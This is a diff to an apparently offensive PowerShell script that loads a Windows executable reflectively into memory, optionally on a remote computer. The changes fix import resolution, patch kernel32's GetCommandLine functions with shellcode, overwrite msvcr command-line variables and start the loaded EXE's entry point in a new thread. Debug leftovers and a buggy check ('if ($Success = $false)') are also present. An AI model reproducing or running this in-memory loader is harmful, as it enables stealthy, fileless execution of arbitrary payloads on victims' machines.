@@ -1234,24 +1234,25 @@ $RemoteScriptBlock = {
 				
 				#Get the first thunk, then loop through all of them
 				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
-				[IntPtr]$ThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ThunkRef, [IntPtr])
+				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
+				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [IntPtr])
 				
-				while ($ThunkRefVal -ne [IntPtr]::Zero)
+				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
 				{
 					$ProcedureName = ''
 					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
 					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
 					#	and doing the comparison, just see if it is less than 0
 					[IntPtr]$NewThunkRef = [IntPtr]::Zero
-					if([Int64]$ThunkRefVal -lt 0)
+					if([Int64]$OriginalThunkRefVal -lt 0)
 					{
 						if ($PEInfo.PE64Bit -eq $true)
 						{
-							[IntPtr]$FuncOrdinal = [Int64]$ThunkRefVal -band 0x7fffffffffffffff
+							[IntPtr]$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0x7fffffffffffffff
 						}
 						else
 						{
-							[IntPtr]$FuncOrdinal = [Int64]$ThunkRefVal -band 0x7fffffff
+							[IntPtr]$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0x7fffffff
 						}
 						
 						$DllInfo = Get-PEDetailedInfo -PEHandle $ImportDllHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
@@ -1277,21 +1278,28 @@ $RemoteScriptBlock = {
 					}
 					else
 					{
-						$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ThunkRefVal)
-						$StringAddr = Add-SignedIntAsUnsigned ($StringAddr) ([System.Runtime.InteropServices.Marshal]::SizeOf([UInt16]))
+						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
+						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([UInt16]))
 						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
 						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
+						
+						#todo delete
+						if ($ProcedureName -ieq "GetCommandLineA" -or $ProcedureName -ieq "GetCommandLineW")
+						{
+							Write-Verbose "todo: $ProcedureName : $NewThunkRef"
+						}
 					}
 					
 					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
 					{
-						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName"
+						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
 					}
 
 					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
 					
 					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]))
-					$ThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ThunkRef, [IntPtr])
+					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]))
+					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [IntPtr])
 				}
 				
 				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_IMPORT_DESCRIPTOR))
@@ -1436,12 +1444,12 @@ $RemoteScriptBlock = {
 		$ReturnArray = @() 
 		
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
-		
+		$OldProtectFlag = 0
 		#################################################
 		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
 		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
-		$CmdLineWArgsPtr += [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-		$CmdLineAArgsPtr += [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
+		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 	
 		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
 		if ($Kernel32Handle -eq [IntPtr]::Zero)
@@ -1449,11 +1457,23 @@ $RemoteScriptBlock = {
 			throw "Kernel32 handle null"
 		}
 		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetCommandLineA")
+		$GetCommandLineAAddr = Add-SignedIntAsUnsigned $GetCommandLineAAddr 2
+		[IntPtr]$GetCommandLineAAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GetCommandLineAAddr, [IntPtr])
+		Write-Verbose "hi"
+		[IntPtr]$GetCommandLineAAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GetCommandLineAAddr, [IntPtr])
+		Write-Verbose "hi2"
 		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetCommandLineW")
+		$GetCommandLineWAddr = Add-SignedIntAsUnsigned $GetCommandLineWAddr 2
+		[IntPtr]$GetCommandLineWAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GetCommandLineWAddr, [IntPtr])
+		Write-Verbose "hi3"
+		[IntPtr]$GetCommandLineWAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GetCommandLineWAddr, [IntPtr])
+		Write-Verbose "hi4"
 		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
 		{
 			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
 		}
+		Write-Verbose "todo: gca: $GetCommandLineAAddr"
+		Write-Verbose "todo: gcw: $GetCommandLineWAddr"
 		
 		#Prepare the shellcode
 		[Byte[]]$Shellcode1 = @()
@@ -1483,11 +1503,12 @@ $RemoteScriptBlock = {
 			throw "Call to VirtualProtect failed"
 		}
 		
-		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddr
-		$GetCommandLineAAddr = Add-SignedIntAsUnsigned $GetCommandLineAAddr ($Shellcode1.Length)
-		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddr, $false)
-		$GetCommandLineAAddr = Add-SignedIntAsUnsigned $GetCommandLineAAddr $PtrSize
-		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddr
+		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
+		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
+		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
 		
 		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		
@@ -1500,13 +1521,66 @@ $RemoteScriptBlock = {
 			throw "Call to VirtualProtect failed"
 		}
 		
-		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddr
-		$GetCommandLineWAddr = Add-SignedIntAsUnsigned $GetCommandLineWAddr ($Shellcode1.Length)
-		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddr, $false)
-		$GetCommandLineWAddr = Add-SignedIntAsUnsigned $GetCommandLineWAddr $PtrSize
-		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddr
+		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
+		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
+		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
 		
 		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#################################################
+		
+		
+		#################################################
+		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
+		#	I don't know why exactly.. But the msvcr DLL that a "DLL" compiled executable imports has an export called _acmdln and _wcmdln.
+		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
+		#	argv and argc values stored in these variables. So the wasy thing to do is just overwrite the variable since it is exported.
+		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll")
+		
+		foreach ($Dll in $DllList)
+		{
+			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
+			if ($DllHandle -ne [IntPtr]::Zero)
+			{
+				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
+				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
+				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
+				{
+					"Error, couldn't find _wcmdln or _acmdln"
+				}
+				
+				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
+				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+				
+				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
+				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [IntPtr])
+				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [IntPtr])
+				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
+				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
+				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
+				
+				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				if ($Success = $false)
+				{
+					throw "Call to VirtualProtect failed"
+				}
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
+				Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				
+				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				if ($Success = $false)
+				{
+					throw "Call to VirtualProtect failed"
+				}
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
+				Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+			}
+		}
 		#################################################
 		
 		
@@ -1590,6 +1664,7 @@ $RemoteScriptBlock = {
 			Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		}
 		#################################################
+
 		Write-Output $ReturnArray
 	}
 	
@@ -1754,7 +1829,7 @@ $RemoteScriptBlock = {
 		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
 		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
 		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
-		
+
 		
 		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
 		Write-Verbose "Import DLL's needed by the PE we are loading"
@@ -1792,11 +1867,12 @@ $RemoteScriptBlock = {
 
 			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
 			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
-			Write-Verbose "Call EXE Main function"
-			
 			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr"
+						#todo delete
+			Read-Host "Press any key to begin execution" | Out-Null
+			Write-Verbose "Creating thread for process"
 			$Success = Invoke-Win32 "kernel32.dll" ([IntPtr]) "CreateThread" @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [Ref]) @([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([IntPtr]::Zero))
-			Write-Verbose "Created thread for process"
 			
 			while($true)
 			{
@@ -1898,8 +1974,7 @@ $RemoteScriptBlock = {
 #Main function to either run the script locally or remotely
 Function Main
 {
-	[System.Diagnostics.Process]::GetCurrentProcess() | Select-Object id
-	Read-Host "Enter to continue"
+	[System.Diagnostics.Process]::GetCurrentProcess() | Select-Object id	#todo delete
 	
 	[Byte[]]$PEBytes = $null
 	
@@ -1929,7 +2004,14 @@ Function Main
     $PEBytes[1] = 0
 	
 	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
-	$ExeArgs = "ReflectiveExe $ExeArgs"
+	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
+	{
+		$ExeArgs = "ReflectiveExe $ExeArgs"
+	}
+	else
+	{
+		$ExeArgs = "ReflectiveExe"
+	}
 
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
